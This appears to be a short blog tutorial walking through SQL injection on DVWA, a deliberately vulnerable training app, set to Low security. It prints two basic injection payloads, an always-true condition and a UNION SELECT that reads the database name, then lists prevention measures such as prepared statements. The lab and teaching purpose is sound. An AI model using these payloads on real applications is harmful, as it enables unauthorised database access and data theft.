title: "DVWA SQL Injection - Step by Step Guide"
date: 2026-04-28
categories: [Web Security, DVWA]

DVWA SQL Injection - Complete Walkthrough

Q. What is SQL Injection?
SQL Injection is a web vulnerability that allows attackers to manipulate database queries.

Lab Setup
- DVWA installed
- Security Level: Low
- Burp Suite (optional)

Step 1: Identify Input Field
Go to DVWA → SQL Injection page

Step 2: Basic Payload

bash
' OR '1'='1

Step 3: Extract Data
' UNION SELECT null, database() #

Explanation
' OR '1'='1 → Always true condition
UNION SELECT → Extracts database info

Prevention:
Use prepared statements
Input validation
Web Application Firewall (WAF)
Conclusion

SQL Injection is simple but dangerous. Always secure your inputs.
